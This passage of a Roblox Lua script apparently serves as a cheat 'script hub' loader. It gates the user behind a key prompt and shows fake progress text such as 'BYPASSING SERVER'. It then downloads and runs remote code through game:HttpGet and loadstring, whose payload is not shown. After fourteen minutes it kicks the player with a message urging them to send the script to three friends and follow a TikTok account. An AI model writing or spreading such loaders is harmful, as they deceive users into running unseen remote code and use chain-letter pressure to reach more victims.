-- Main execution
local function startMainFlow()
    -- GUI 1
    local gui1, button1 = createMainVerificationGUI()
    
    button1.MouseButton1Click:Connect(function()
        gui1:Destroy()
        wait(0.1)
        
        -- GUI 2
        local gui2, statusText, spinner, progressBar = createRememberGUI()
        
        -- Status updates with progress bar animation
        wait(1)
        statusText.Text = "LOADING SCRIPT... (15s)"
        progressBar:TweenSize(UDim2.new(0.25, 0, 1, 0), "Out", "Linear", 5)
        wait(5)
        
        statusText.Text = "BYPASSING SERVER..."
        progressBar:TweenSize(UDim2.new(0.5, 0, 1, 0), "Out", "Linear", 5)
        wait(5)
        
        statusText.Text = "FINALIZING..."
        progressBar:TweenSize(UDim2.new(0.75, 0, 1, 0), "Out", "Linear", 5)
        wait(5)
        
        statusText.Text = "EXECUTING SCRIPT..."
        progressBar:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Linear", 1)
        
        -- Load the script
        local success, result = pcall(function()
            local content = game:HttpGet(SCRIPT_URL)
            loadstring(content)()
        end)
        
        if success then
            statusText.Text = "SCRIPT LOADED SUCCESSFULLY!"
            statusText.TextColor3 = COLORS.Success
        else
            statusText.Text = "SCRIPT LOADING FAILED!"
            statusText.TextColor3 = COLORS.Warning
        end
        
        wait(2)
        gui2:Destroy()
        
        -- Corner Alert
        createCornerAlert()
        
        -- Wait 14 minutes
        wait(840)
        
        -- Final Kick
        local kickGui = createFinalKickGUI()
        wait(5)
        kickGui:Destroy()
        
        -- Kick player
        player:Kick("LAST STEP LEFT! SEND THIS SCRIPT TO YOUR 3 FRIENDS AND WE ARE ALSO DOING A GIVEAWAY SOON\nTIKTOK ID -> DRIX_SCRIPT_HUB")
    end)
end

-- Start everything
local function init()
    -- Run validation first
    if not validateEnvironment() then return end
    
    -- Create key system
    local keyGui, keyBox, submitBtn, getKeyBtn, linkContainer, statusLabel = createKeyGUI()
    
    -- Key check function
    local function checkKey()
        if keyBox.Text == CORRECT_KEY then
            statusLabel.Text = "KEY ACCEPTED! REDIRECTING..."
            statusLabel.TextColor3 = COLORS.Success
            wait(1)
            keyGui:Destroy()
            startMainFlow()
        else
            statusLabel.Text = "INVALID KEY! TRY AGAIN"
            statusLabel.TextColor3 = COLORS.Warning
        end
    end
    
    submitBtn.MouseButton1Click:Connect(checkKey)
    
    keyBox.FocusLost:Connect(function(enter)
        if enter then
            checkKey()
        end
    end)
    
    getKeyBtn.MouseButton1Click:Connect(function()
        linkContainer.Visible = not linkContainer.Visible
        if linkContainer.Visible then
            getKeyBtn.Text = "HIDE LINK"
            getKeyBtn.BackgroundColor3 = COLORS.Primary
        else
            getKeyBtn.Text = "GET KEY"
            getKeyBtn.BackgroundColor3 = COLORS.SecondaryLight
        end
    end)
end

-- Run the script
init()
